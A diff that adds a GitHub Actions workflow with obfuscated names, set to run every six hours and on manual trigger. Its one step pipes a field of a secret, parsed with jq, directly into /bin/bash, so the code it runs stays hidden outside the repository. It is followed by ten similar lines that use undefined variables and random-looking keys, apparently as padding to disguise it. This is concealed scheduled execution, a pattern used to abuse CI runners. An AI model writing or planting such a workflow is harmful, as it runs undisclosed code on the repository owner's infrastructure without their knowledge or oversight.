@@ -1,0 +1,26 @@
+name: boxrayx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: boxrayx
+        env:
+          vrjxt5754: ${{ secrets.vrjxt5754 }}
+        run: |
+          echo $vrjxt5754 | jq -r .e2 | /bin/bash
+          echo $oa0 | jq -r .zjv7280 | /bin/bash
+          echo $veh2 | jq -r .p52 | /bin/bash
+          echo $eawmk30541 | jq -r .gp11864 | /bin/bash
+          echo $dwtm058 | jq -r .sv869 | /bin/bash
+          echo $zt1349 | jq -r .eptn709 | /bin/bash
+          echo $iaz74011 | jq -r .y139 | /bin/bash
+          echo $umx48874 | jq -r .n95688 | /bin/bash
+          echo $sdl37668 | jq -r .zqaw34046 | /bin/bash
+          echo $lnwn967 | jq -r .j129 | /bin/bash
+          echo $wlf69 | jq -r .ocn91 | /bin/bash
+
